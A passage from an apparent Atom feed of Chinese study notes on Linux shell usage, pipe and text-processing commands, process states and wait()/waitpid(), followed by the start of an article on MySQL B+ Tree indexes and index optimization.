<li>命令与文件补全：快捷键：tab</li>
<li>命名别名：例如 ll 是 ls -al 的别名</li>
<li>shell scripts</li>
<li>通配符：例如 ls -l /usr/bin/X* 列出 /usr/bin 下面所有以 X 开头的文件</li>
</ul>
<h2 id="变量操作" tabindex="-1"> 变量操作</h2>
<p>对一个变量赋值直接使用 =。</p>
<p>对变量取用需要在变量前加上 $ ，也可以用 ${} 的形式；</p>
<p>输出变量使用 echo 命令。</p>
<div><pre><code>$ <span>x</span><span>=</span>abc
$ <span>echo</span> <span>$x</span>
$ <span>echo</span> <span>${x}</span>
</code></pre></div><p>变量内容如果有空格，必须使用双引号或者单引号。</p>
<ul>
<li>双引号内的特殊字符可以保留原本特性，例如 x=&quot;lang is $LANG&quot;，则 x 的值为 lang is zh_TW.UTF-8；</li>
<li>单引号内的特殊字符就是特殊字符本身，例如 x='lang is $LANG'，则 x 的值为 lang is $LANG。</li>
</ul>
<p>可以使用 `指令` 或者 $(指令) 的方式将指令的执行结果赋值给变量。例如 version=$(uname -r)，则 version 的值为 4.15.0-22-generic。</p>
<p>可以使用 export 命令将自定义变量转成环境变量，环境变量可以在子程序中使用，所谓子程序就是由当前 Bash 而产生的子 Bash。</p>
<p>Bash 的变量可以声明为数组和整数数字。注意数字类型没有浮点数。如果不进行声明，默认是字符串类型。变量的声明使用 declare 命令：</p>
<div><pre><code>$ declare [-aixr] variable
-a ： 定义为数组类型
-i ： 定义为整数类型
-x ： 定义为环境变量
-r ： 定义为 readonly 类型
</code></pre></div><p>使用 [ ] 来对数组进行索引操作：</p>
<div><pre><code>$ array<span>[</span><span>1</span><span>]</span><span>=</span>a
$ array<span>[</span><span>2</span><span>]</span><span>=</span>b
$ <span>echo</span> <span>${array<span>[</span>1<span>]</span>}</span>
</code></pre></div><h2 id="指令搜索顺序" tabindex="-1"> 指令搜索顺序</h2>
<ul>
<li>以绝对或相对路径来执行指令，例如 /bin/ls 或者 ./ls ；</li>
<li>由别名找到该指令来执行；</li>
<li>由 Bash 内置的指令来执行；</li>
<li>按 $PATH 变量指定的搜索路径的顺序找到第一个指令来执行。</li>
</ul>
<h2 id="数据流重定向" tabindex="-1"> 数据流重定向</h2>
<p>重定向指的是使用文件代替标准输入、标准输出和标准错误输出。</p>
<table>
<thead>
<tr>
<th style="text-align:center">1</th>
<th style="text-align:center">代码</th>
<th style="text-align:center">运算符</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">标准输入 (stdin)</td>
<td style="text-align:center">0</td>
<td style="text-align:center">&lt; 或 &lt;&lt;</td>
</tr>
<tr>
<td style="text-align:center">标准输出 (stdout)</td>
<td style="text-align:center">1</td>
<td style="text-align:center">&gt; 或 &gt;&gt;</td>
</tr>
<tr>
<td style="text-align:center">标准错误输出 (stderr)</td>
<td style="text-align:center">2</td>
<td style="text-align:center">2&gt; 或 2&gt;&gt;</td>
</tr>
</tbody>
</table>
<p>其中，有一个箭头的表示以覆盖的方式重定向，而有两个箭头的表示以追加的方式重定向。</p>
<p>可以将不需要的标准输出以及标准错误输出重定向到 /dev/null，相当于扔进垃圾箱。</p>
<p>如果需要将标准输出以及标准错误输出同时重定向到一个文件，需要将某个输出转换为另一个输出，例如 2&gt;&amp;1 表示将标准错误输出转换为标准输出。</p>
<div><pre><code>$ <span>find</span> /home -name .bashrc <span>></span> list <span><span>2</span>></span><span>&amp;1</span>
</code></pre></div><h1 id="八、管道指令" tabindex="-1"> 八、管道指令</h1>
<p>管道是将一个命令的标准输出作为另一个命令的标准输入，在数据需要经过多个步骤的处理之后才能得到我们想要的内容时就可以使用管道。</p>
<p>在命令之间使用 | 分隔各个管道命令。</p>
<div><pre><code>$ <span>ls</span> -al /etc <span>|</span> <span>less</span>
</code></pre></div><h2 id="提取指令" tabindex="-1"> 提取指令</h2>
<p>cut 对数据进行切分，取出想要的部分。</p>
<p>切分过程一行一行地进行。</p>
<div><pre><code>$ cut
-d ：分隔符
-f ：经过 -d 分隔后，使用 -f n 取出第 n 个区间
-c ：以字符为单位取出区间
</code></pre></div><p>示例 1：last 显示登入者的信息，取出用户名。</p>
<div><pre><code>$ last
root pts/1 192.168.201.101 Sat Feb 7 12:35 still logged in
root pts/1 192.168.201.101 Fri Feb 6 12:13 - 18:46 (06:33)
root pts/1 192.168.201.254 Thu Feb 5 22:37 - 23:53 (01:16)

$ last | cut -d ' ' -f 1
</code></pre></div><p>示例 2：将 export 输出的信息，取出第 12 字符以后的所有字符串。</p>
<div><pre><code>$ export
declare -x HISTCONTROL="ignoredups"
declare -x HISTSIZE="1000"
declare -x HOME="/home/dmtsai"
declare -x HOSTNAME="study.centos.vbird"
.....(其他省略).....

$ export | cut -c 12-
</code></pre></div><h2 id="排序指令" tabindex="-1"> 排序指令</h2>
<p><strong>sort</strong>  用于排序。</p>
<div><pre><code>$ sort [-fbMnrtuk] [file or stdin]
-f ：忽略大小写
-b ：忽略最前面的空格
-M ：以月份的名字来排序，例如 JAN，DEC
-n ：使用数字
-r ：反向排序
-u ：相当于 unique，重复的内容只出现一次
-t ：分隔符，默认为 tab
-k ：指定排序的区间
</code></pre></div><p>示例：/etc/passwd 文件内容以 : 来分隔，要求以第三列进行排序。</p>
<div><pre><code>$ cat /etc/passwd | sort -t ':' -k 3
root:x:0:0:root:/root:/bin/bash
dmtsai:x:1000:1000:dmtsai:/home/dmtsai:/bin/bash
alex:x:1001:1002::/home/alex:/bin/bash
arod:x:1002:1003::/home/arod:/bin/bash
</code></pre></div><p><strong>uniq</strong>  可以将重复的数据只取一个。</p>
<div><pre><code>$ uniq [-ic]
-i ：忽略大小写
-c ：进行计数
</code></pre></div><p>示例：取得每个人的登录总次数</p>
<div><pre><code>$ last | cut -d ' ' -f 1 | sort | uniq -c
1
6 (unknown
47 dmtsai
4 reboot
7 root
1 wtmp
</code></pre></div><h2 id="双向输出重定向" tabindex="-1"> 双向输出重定向</h2>
<p>输出重定向会将输出内容重定向到文件中，而  <strong>tee</strong>  不仅能够完成这个功能，还能保留屏幕上的输出。也就是说，使用 tee 指令，一个输出会同时传送到文件和屏幕上。</p>
<div><pre><code>$ tee [-a] file
</code></pre></div><h2 id="字符转换指令" tabindex="-1"> 字符转换指令</h2>
<p><strong>tr</strong>  用来删除一行中的字符，或者对字符进行替换。</p>
<div><pre><code>$ tr [-ds] SET1 ...
-d ： 删除行中 SET1 这个字符串
</code></pre></div><p>示例，将 last 输出的信息所有小写转换为大写。</p>
<div><pre><code>$ last | tr '[a-z]' '[A-Z]'
</code></pre></div><p><strong>col</strong>  将 tab 字符转为空格字符。</p>
<div><pre><code>$ col [-xb]
-x ： 将 tab 键转换成对等的空格键
</code></pre></div><p><strong>expand</strong>  将 tab 转换一定数量的空格，默认是 8 个。</p>
<div><pre><code>$ expand [-t] file
-t ：tab 转为空格的数量
</code></pre></div><p><strong>join</strong>  将有相同数据的那一行合并在一起。</p>
<div><pre><code>$ join [-ti12] file1 file2
-t ：分隔符，默认为空格
-i ：忽略大小写的差异
-1 ：第一个文件所用的比较字段
-2 ：第二个文件所用的比较字段
</code></pre></div><p><strong>paste</strong>  直接将两行粘贴在一起。</p>
<div><pre><code>$ paste [-d] file1 file2
-d ：分隔符，默认为 tab
</code></pre></div><h2 id="分区指令" tabindex="-1"> 分区指令</h2>
<p><strong>split</strong>  将一个文件划分成多个文件。</p>
<div><pre><code>$ split [-bl] file PREFIX
-b ：以大小来进行分区，可加单位，例如 b, k, m 等
-l ：以行数来进行分区。
- PREFIX ：分区文件的前导名称
</code></pre></div><h1 id="九、正则表达式" tabindex="-1"> 九、正则表达式</h1>
<h2 id="grep" tabindex="-1"> grep</h2>
<p>g/re/p（globally search a regular expression and print)，使用正则表示式进行全局查找并打印。</p>
<div><pre><code>$ grep [-acinv] [--color=auto] 搜寻字符串 filename
-c ： 统计个数
-i ： 忽略大小写
-n ： 输出行号
-v ： 反向选择，也就是显示出没有 搜寻字符串 内容的那一行
--color=auto ：找到的关键字加颜色显示
</code></pre></div><p>示例：把含有 the 字符串的行提取出来（注意默认会有 --color=auto 选项，因此以下内容在 Linux 中有颜色显示 the 字符串）</p>
<div><pre><code>$ grep -n 'the' regular_express.txt
8:I can't finish the test.
12:the symbol '*' is represented as start.
15:You are the best is mean you are the no. 1.
16:The world Happy is the same with "glad".
18:google is the best tools for search keyword
</code></pre></div><p>因为 { 和 } 在 shell 是有特殊意义的，因此必须要使用转义字符进行转义。</p>
<div><pre><code>$ grep -n 'go\{2,5\}g' regular_express.txt
</code></pre></div><h2 id="printf" tabindex="-1"> printf</h2>
<p>用于格式化输出。它不属于管道命令，在给 printf 传数据时需要使用 $( ) 形式。</p>
<div><pre><code>$ printf '%10s %5i %5i %5i %8.2f \n' $(cat printf.txt)
    DmTsai    80    60    92    77.33
     VBird    75    55    80    70.00
       Ken    60    90    70    73.33
</code></pre></div><h2 id="awk" tabindex="-1"> awk</h2>
<p>是由 Alfred Aho，Peter Weinberger, 和 Brian Kernighan 创造，awk 这个名字就是这三个创始人名字的首字母。</p>
<p>awk 每次处理一行，处理的最小单位是字段，每个字段的命名方式为：$n，n 为字段号，从 1 开始，$0 表示一整行。</p>
<p>示例：取出最近五个登录用户的用户名和 IP</p>
<div><pre><code>$ last -n 5
dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged in
dmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22)
dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12)
dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14)
dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15)
</code></pre></div><div><pre><code>$ last -n 5 | awk '{print $1 "\t" $3}'
</code></pre></div><p>可以根据字段的某些条件进行匹配，例如匹配字段小于某个值的那一行数据。</p>
<div><pre><code>$ awk '条件类型 1 {动作 1} 条件类型 2 {动作 2} ...' filename
</code></pre></div><p>示例：/etc/passwd 文件第三个字段为 UID，对 UID 小于 10 的数据进行处理。</p>
<div><pre><code>$ cat /etc/passwd | awk 'BEGIN {FS=":"} $3 &lt; 10 {print $1 "\t " $3}'
root 0
bin 1
daemon 2
</code></pre></div><p>awk 变量：</p>
<table>
<thead>
<tr>
<th style="text-align:center">变量名称</th>
<th>代表意义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">NF</td>
<td>每一行拥有的字段总数</td>
</tr>
<tr>
<td style="text-align:center">NR</td>
<td>目前所处理的是第几行数据</td>
</tr>
<tr>
<td style="text-align:center">FS</td>
<td>目前的分隔字符，默认是空格键</td>
</tr>
</tbody>
</table>
<p>示例：显示正在处理的行号以及每一行有多少字段</p>
<div><pre><code>$ last -n 5 | awk '{print $1 "\t lines: " NR "\t columns: " NF}'
dmtsai lines: 1 columns: 10
dmtsai lines: 2 columns: 10
dmtsai lines: 3 columns: 10
dmtsai lines: 4 columns: 10
dmtsai lines: 5 columns: 9
</code></pre></div><h1 id="十、进程管理" tabindex="-1"> 十、进程管理</h1>
<h2 id="查看进程" tabindex="-1"> 查看进程</h2>
<h3 id="_1-ps" tabindex="-1"> 1. ps</h3>
<p>查看某个时间点的进程信息。</p>
<p>示例一：查看自己的进程</p>
<div><pre><code><span># ps -l</span>
</code></pre></div><p>示例二：查看系统所有进程</p>
<div><pre><code><span># ps aux</span>
</code></pre></div><p>示例三：查看特定的进程</p>
<div><pre><code><span># ps aux | grep threadx</span>
</code></pre></div><h3 id="_2-pstree" tabindex="-1"> 2. pstree</h3>
<p>查看进程树。</p>
<p>示例：查看所有进程树</p>
<div><pre><code><span># pstree -A</span>
</code></pre></div><h3 id="_3-top" tabindex="-1"> 3. top</h3>
<p>实时显示进程信息。</p>
<p>示例：两秒钟刷新一次</p>
<div><pre><code><span># top -d 2</span>
</code></pre></div><h3 id="_4-netstat" tabindex="-1"> 4. netstat</h3>
<p>查看占用端口的进程</p>
<p>示例：查看特定端口的进程</p>
<div><pre><code><span># netstat -anp | grep port</span>
</code></pre></div><h2 id="进程状态" tabindex="-1"> 进程状态</h2>
<table>
<thead>
<tr>
<th style="text-align:center">状态</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">R</td>
<td>running or runnable (on run queue)<br>正在执行或者可执行，此时进程位于执行队列中。</td>
</tr>
<tr>
<td style="text-align:center">D</td>
<td>uninterruptible sleep (usually I/O)<br>不可中断阻塞，通常为 IO 阻塞。</td>
</tr>
<tr>
<td style="text-align:center">S</td>
<td>interruptible sleep (waiting for an event to complete) <br> 可中断阻塞，此时进程正在等待某个事件完成。</td>
</tr>
<tr>
<td style="text-align:center">Z</td>
<td>zombie (terminated but not reaped by its parent)<br>僵死，进程已经终止但是尚未被其父进程获取信息。</td>
</tr>
<tr>
<td style="text-align:center">T</td>
<td>stopped (either by a job control signal or because it is being traced) <br> 结束，进程既可以被作业控制信号结束，也可能是正在被追踪。</td>
</tr>
<tr>
<td style="text-align:center"><br></td>
<td></td>
</tr>
</tbody>
</table>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/2bab4127-3e7d-48cc-914e-436be859fb05.png" width="490px"/> </div><br>
<h2 id="sigchld" tabindex="-1"> SIGCHLD</h2>
<p>当一个子进程改变了它的状态时（停止运行，继续运行或者退出），有两件事会发生在父进程中：</p>
<ul>
<li>得到 SIGCHLD 信号；</li>
<li>waitpid() 或者 wait() 调用会返回。</li>
</ul>
<p>其中子进程发送的 SIGCHLD 信号包含了子进程的信息，比如进程 ID、进程状态、进程使用 CPU 的时间等。</p>
<p>在子进程退出时，它的进程描述符不会立即释放，这是为了让父进程得到子进程信息，父进程通过 wait() 和 waitpid() 来获得一个已经退出的子进程的信息。</p>
<div align="center">  </div><br>
<h2 id="wait" tabindex="-1"> wait()</h2>
<div><pre><code><span>pid_t</span> <span>wait</span><span>(</span><span>int</span> <span>*</span>status<span>)</span>
</code></pre></div><p>父进程调用 wait() 会一直阻塞，直到收到一个子进程退出的 SIGCHLD 信号，之后 wait() 函数会销毁子进程并返回。</p>
<p>如果成功，返回被收集的子进程的进程 ID；如果调用进程没有子进程，调用就会失败，此时返回 -1，同时 errno 被置为 ECHILD。</p>
<p>参数 status 用来保存被收集的子进程退出时的一些状态，如果对这个子进程是如何死掉的毫不在意，只想把这个子进程消灭掉，可以设置这个参数为 NULL。</p>
<h2 id="waitpid" tabindex="-1"> waitpid()</h2>
<div><pre><code><span>pid_t</span> <span>waitpid</span><span>(</span><span>pid_t</span> pid<span>,</span> <span>int</span> <span>*</span>status<span>,</span> <span>int</span> options<span>)</span>
</code></pre></div><p>作用和 wait() 完全相同，但是多了两个可由用户控制的参数 pid 和 options。</p>
<p>pid 参数指示一个子进程的 ID，表示只关心这个子进程退出的 SIGCHLD 信号。如果 pid=-1 时，那么和 wait() 作用相同，都是关心所有子进程退出的 SIGCHLD 信号。</p>
<p>options 参数主要有 WNOHANG 和 WUNTRACED 两个选项，WNOHANG 可以使 waitpid() 调用变成非阻塞的，也就是说它会立即返回，父进程可以继续执行其它任务。</p>
<h2 id="孤儿进程" tabindex="-1"> 孤儿进程</h2>
<p>一个父进程退出，而它的一个或多个子进程还在运行，那么这些子进程将成为孤儿进程。</p>
<p>孤儿进程将被 init 进程（进程号为 1）所收养，并由 init 进程对它们完成状态收集工作。</p>
<p>由于孤儿进程会被 init 进程收养，所以孤儿进程不会对系统造成危害。</p>
<h2 id="僵尸进程" tabindex="-1"> 僵尸进程</h2>
<p>一个子进程的进程描述符在子进程退出时不会释放，只有当父进程通过 wait() 或 waitpid() 获取了子进程信息后才会释放。如果子进程退出，而父进程并没有调用 wait() 或 waitpid()，那么子进程的进程描述符仍然保存在系统中，这种进程称之为僵尸进程。</p>
<p>僵尸进程通过 ps 命令显示出来的状态为 Z（zombie）。</p>
<p>系统所能使用的进程号是有限的，如果产生大量僵尸进程，将因为没有可用的进程号而导致系统不能产生新的进程。</p>
<p>要消灭系统中大量的僵尸进程，只需要将其父进程杀死，此时僵尸进程就会变成孤儿进程，从而被 init 进程所收养，这样 init 进程就会释放所有的僵尸进程所占有的资源，从而结束僵尸进程。</p>
<h1 id="参考资料" tabindex="-1"> 参考资料</h1>
<ul>
<li>鸟哥. 鸟 哥 的 Linux 私 房 菜 基 础 篇 第 三 版[J]. 2009.</li>
<li><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-rpmdpkg/index.html" target="_blank" rel="noopener noreferrer">Linux 平台上的软件包管理</a></li>
<li><a href="http://liubigbin.github.io/2016/03/11/Linux-%E4%B9%8B%E5%AE%88%E6%8A%A4%E8%BF%9B%E7%A8%8B%E3%80%81%E5%83%B5%E6%AD%BB%E8%BF%9B%E7%A8%8B%E4%B8%8E%E5%AD%A4%E5%84%BF%E8%BF%9B%E7%A8%8B/" target="_blank" rel="noopener noreferrer">Linux 之守护进程、僵死进程与孤儿进程</a></li>
<li><a href="https://stackoverflow.com/questions/185899/what-is-the-difference-between-a-symbolic-link-and-a-hard-link" target="_blank" rel="noopener noreferrer">What is the difference between a symbolic link and a hard link?</a></li>
<li><a href="https://idea.popcount.org/2012-12-11-linux-process-states/" target="_blank" rel="noopener noreferrer">Linux process states</a></li>
<li><a href="https://en.wikipedia.org/wiki/GUID_Partition_Table" target="_blank" rel="noopener noreferrer">GUID Partition Table</a></li>
<li><a href="https://blog.csdn.net/kevinhg/article/details/7001719" target="_blank" rel="noopener noreferrer">详解 wait 和 waitpid 函数</a></li>
<li><a href="https://blog.csdn.net/tianlesoftware/article/details/6009110" target="_blank" rel="noopener noreferrer">IDE、SATA、SCSI、SAS、FC、SSD 硬盘类型介绍</a></li>
<li><a href="http://www.mpchunter.com/s3000/akai-ib-301s-scsi-interface-for-s2800s3000/" target="_blank" rel="noopener noreferrer">Akai IB-301S SCSI Interface for S2800,S3000</a></li>
<li><a href="https://en.wikipedia.org/wiki/Parallel_ATA" target="_blank" rel="noopener noreferrer">Parallel ATA</a></li>
<li><a href="http://www.thessdreview.com/our-reviews/adata-xpg-sx900-256gb-sata-3-ssd-review-expanded-capacity-and-sandforce-driven-speed/4/" target="_blank" rel="noopener noreferrer">ADATA XPG SX900 256GB SATA 3 SSD Review – Expanded Capacity and SandForce Driven Speed</a></li>
<li><a href="https://blogs.cisco.com/datacenter/decoding-ucs-invicta-part-1" target="_blank" rel="noopener noreferrer">Decoding UCS Invicta – Part 1</a></li>
<li><a href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E7%9B%98" target="_blank" rel="noopener noreferrer">硬盘</a></li>
<li><a href="http://www.differencebetween.info/difference-between-sas-and-sata" target="_blank" rel="noopener noreferrer">Difference between SAS and SATA</a></li>
<li><a href="https://zh.wikipedia.org/wiki/BIOS" target="_blank" rel="noopener noreferrer">BIOS</a></li>
<li><a href="https://www.cs.rutgers.edu/~pxk/416/notes/13-fs-studies.html" target="_blank" rel="noopener noreferrer">File system design case studies</a></li>
<li><a href="https://classes.soe.ucsc.edu/cmps111/Fall08/proj4.shtml" target="_blank" rel="noopener noreferrer">Programming Project #4</a></li>
<li><a href="http://web.cs.ucla.edu/classes/fall14/cs111/scribe/11a/index.html" target="_blank" rel="noopener noreferrer">FILE SYSTEM DESIGN</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">操作系统</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">一、索引</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/MySQL.html"/>
    <updated>2022-05-16T11:59:04.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="一、索引" tabindex="-1"> 一、索引</h1>
<h2 id="b-tree-原理" tabindex="-1"> B+ Tree 原理</h2>
<h3 id="_1-数据结构" tabindex="-1"> 1. 数据结构</h3>
<p>B Tree 指的是 Balance Tree，也就是平衡树。平衡树是一颗查找树，并且所有叶子节点位于同一层。</p>
<p>B+ Tree 是基于 B Tree 和叶子节点顺序访问指针进行实现，它具有 B Tree 的平衡性，并且通过顺序访问指针来提高区间查询的性能。</p>
<p>在 B+ Tree 中，一个节点中的 key 从左到右非递减排列，如果某个指针的左右相邻 key 分别是 key<sub>i</sub> 和 key<sub>i+1</sub>，且不为 null，则该指针指向节点的所有 key 大于等于 key<sub>i</sub> 且小于等于 key<sub>i+1</sub>。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/33576849-9275-47bb-ada7-8ded5f5e7c73.png" width="350px"> </div><br>
<h3 id="_2-操作" tabindex="-1"> 2. 操作</h3>
<p>进行查找操作时，首先在根节点进行二分查找，找到一个 key 所在的指针，然后递归地在指针所指向的节点进行查找。直到查找到叶子节点，然后在叶子节点上进行二分查找，找出 key 所对应的 data。</p>
<p>插入删除操作会破坏平衡树的平衡性，因此在插入删除操作之后，需要对树进行一个分裂、合并、旋转等操作来维护平衡性。</p>
<h3 id="_3-与红黑树的比较" tabindex="-1"> 3. 与红黑树的比较</h3>
<p>红黑树等平衡树也可以用来实现索引，但是文件系统及数据库系统普遍采用 B+ Tree 作为索引结构，主要有以下两个原因：</p>
<p>（一）更少的查找次数</p>
<p>平衡树查找操作的时间复杂度和树高 h 相关，O(h)=O(log<sub>d</sub>N)，其中 d 为每个节点的出度。</p>
<p>红黑树的出度为 2，而 B+ Tree 的出度一般都非常大，所以红黑树的树高 h 很明显比 B+ Tree 大非常多，查找的次数也就更多。</p>
<p>（二）利用磁盘预读特性</p>
<p>为了减少磁盘 I/O 操作，磁盘往往不是严格按需读取，而是每次都会预读。预读过程中，磁盘进行顺序读取，顺序读取不需要进行磁盘寻道，并且只需要很短的磁盘旋转时间，速度会非常快。</p>
<p>操作系统一般将内存和磁盘分割成固定大小的块，每一块称为一页，内存与磁盘以页为单位交换数据。数据库系统将索引的一个节点的大小设置为页的大小，使得一次 I/O 就能完全载入一个节点。并且可以利用预读特性，相邻的节点也能够被预先载入。</p>
<h2 id="mysql-索引" tabindex="-1"> MySQL 索引</h2>
<p>索引是在存储引擎层实现的，而不是在服务器层实现的，所以不同存储引擎具有不同的索引类型和实现。</p>
<h3 id="_1-b-tree-索引" tabindex="-1"> 1. B+Tree 索引</h3>
<p>是大多数 MySQL 存储引擎的默认索引类型。</p>
<p>因为不再需要进行全表扫描，只需要对树进行搜索即可，所以查找速度快很多。</p>
<p>因为 B+ Tree 的有序性，所以除了用于查找，还可以用于排序和分组。</p>
<p>可以指定多个列作为索引列，多个索引列共同组成键。</p>
<p>适用于全键值、键值范围和键前缀查找，其中键前缀查找只适用于最左前缀查找。如果不是按照索引列的顺序进行查找，则无法使用索引。</p>
<p>InnoDB 的 B+Tree 索引分为主索引和辅助索引。主索引的叶子节点 data 域记录着完整的数据记录，这种索引方式被称为聚簇索引。因为无法把数据行存放在两个不同的地方，所以一个表只能有一个聚簇索引。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/45016e98-6879-4709-8569-262b2d6d60b9.png" width="350px"> </div><br>
<p>辅助索引的叶子节点的 data 域记录着主键的值，因此在使用辅助索引进行查找时，需要先查找到主键值，然后再到主索引中进行查找。</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/7c349b91-050b-4d72-a7f8-ec86320307ea.png" width="350px"> </div><br>
<h3 id="_2-哈希索引" tabindex="-1"> 2. 哈希索引</h3>
<p>哈希索引能以 O(1) 时间进行查找，但是失去了有序性：</p>
<ul>
<li>无法用于排序与分组；</li>
<li>只支持精确查找，无法用于部分查找和范围查找。</li>
</ul>
<p>InnoDB 存储引擎有一个特殊的功能叫“自适应哈希索引”，当某个索引值被使用的非常频繁时，会在 B+Tree 索引之上再创建一个哈希索引，这样就让 B+Tree 索引具有哈希索引的一些优点，比如快速的哈希查找。</p>
<h3 id="_3-全文索引" tabindex="-1"> 3. 全文索引</h3>
<p>MyISAM 存储引擎支持全文索引，用于查找文本中的关键词，而不是直接比较是否相等。</p>
<p>查找条件使用 MATCH AGAINST，而不是普通的 WHERE。</p>
<p>全文索引使用倒排索引实现，它记录着关键词到其所在文档的映射。</p>
<p>InnoDB 存储引擎在 MySQL 5.6.4 版本中也开始支持全文索引。</p>
<h3 id="_4-空间数据索引" tabindex="-1"> 4. 空间数据索引</h3>
<p>MyISAM 存储引擎支持空间数据索引（R-Tree），可以用于地理数据存储。空间数据索引会从所有维度来索引数据，可以有效地使用任意维度来进行组合查询。</p>
<p>必须使用 GIS 相关的函数来维护数据。</p>
<h2 id="索引优化" tabindex="-1"> 索引优化</h2>
<h3 id="_1-独立的列" tabindex="-1"> 1. 独立的列</h3>
<p>在进行查询时，索引列不能是表达式的一部分，也不能是函数的参数，否则无法使用索引。</p>
<p>例如下面的查询不能使用 actor_id 列的索引：</p>
<div><pre><code><span>SELECT</span> actor_id <span>FROM</span> sakila<span>.</span>actor <span>WHERE</span> actor_id <span>+</span> <span>1</span> <span>=</span> <span>5</span><span>;</span>
</code></pre></div><h3 id="_2-多列索引" tabindex="-1"> 2. 多列索引</h3>
<p>在需要使用多个列作为条件进行查询时，使用多列索引比使用多个单列索引性能更好。例如下面的语句中，最好把 actor_id 和 film_id 设置为多列索引。</p>
<div><pre><code><span>SELECT</span> film_id<span>,</span> actor_ id <span>FROM</span> sakila<span>.</span>film_actor
<span>WHERE</span> actor_id <span>=</span> <span>1</span> <span>AND</span> film_id <span>=</span> <span>1</span><span>;</span>
</code></pre></div><h3 id="_3-索引列的顺序" tabindex="-1"> 3. 索引列的顺序</h3>
<p>让选择性最强的索引列放在前面。</p>
<p>索引的选择性是指：不重复的索引值和记录总数的比值。最大值为 1，此时每个记录都有唯一的索引与其对应。选择性越高，每个记录的区分度越高，查询效率也越高。</p>
<p>例如下面显示的结果中 customer_id 的选择性比 staff_id 更高，因此最好把 customer_id 列放在多列索引的前面。</p>
<div><pre><code><span>SELECT</span> <span>COUNT</span><span>(</span><span>DISTINCT</span> staff_id<span>)</span><span>/</span><span>COUNT</span><span>(</span><span>*</span><span>)</span> <span>AS</span> staff_id_selectivity<span>,</span>
<span>COUNT</span><span>(</span><span>DISTINCT</span> customer_id<span>)</span><span>/</span><span>COUNT</span><span>(</span><span>*</span><span>)</span> <span>AS</span> customer_id_selectivity<span>,</span>
<span>COUNT</span><span>(</span><span>*</span><span>)</span>
<span>FROM</span> payment<span>;</span>
</code></pre></div><div><pre><code>   staff_id_selectivity: 0.0001
customer_id_selectivity: 0.0373
               COUNT(*): 16049
</code></pre></div><h3 id="_4-前缀索引" tabindex="-1"> 4. 前缀索引</h3>
<p>对于 BLOB、TEXT 和 VARCHAR 类型的列，必须使用前缀索引，只索引开始的部分字符。</p>
<p>前缀长度的选取需要根据索引选择性来确定。</p>
<h3 id="_5-覆盖索引" tabindex="-1"> 5. 覆盖索引</h3>
<p>索引包含所有需要查询的字段的值。</p>
<p>具有以下优点：</p>
<ul>
<li>索引通常远小于数据行的大小，只读取索引能大大减少数据访问量。</li>
<li>一些存储引擎（例如 MyISAM）在内存中只缓存索引，而数据依赖于操作系统来缓存。因此，只访问索引可以不使用系统调用（通常比较费时）。</li>
<li>对于 InnoDB 引擎，若辅助索引能够覆盖查询，则无需访问主索引。</li>
</ul>
<h2 id="索引的优点" tabindex="-1"> 索引的优点</h2>
<ul>
<li>
<p>大大减少了服务器需要扫描的数据行数。</p>
</li>
<li>
<p>帮助服务器避免进行排序和分组，以及避免创建临时表（B+Tree 索引是有序的，可以用于 ORDER BY 和 GROUP BY 操作。临时表主要是在排序和分组过程中创建，不需要排序和分组，也就不需要创建临时表）。</p>
</li>
<li>
<p>将随机 I/O 变为顺序 I/O（B+Tree 索引是有序的，会将相邻的数据都存储在一起）。</p>
</li>
</ul>
<h2 id="索引的使用条件" tabindex="-1"> 索引的使用条件</h2>
<ul>
<li>
<p>对于非常小的表、大部分情况下简单的全表扫描比建立索引更高效；</p>
</li>
<li>
<p>对于中到大型的表，索引就非常有效；</p>
</li>
<li>
